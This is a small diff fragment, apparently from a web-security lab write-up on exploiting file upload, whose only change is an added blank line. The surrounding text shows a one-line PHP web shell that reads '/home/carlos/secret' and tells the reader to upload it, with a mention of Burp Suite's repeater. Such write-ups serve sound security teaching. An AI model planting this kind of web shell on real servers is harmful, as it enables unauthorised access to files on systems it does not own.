@@ -19,6 +19,7 @@ Then we can create a simple PHP web shell:
 ```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
+
 and upload it.
 
 Now, we can also do all of this through the repeater in BurpSuite.
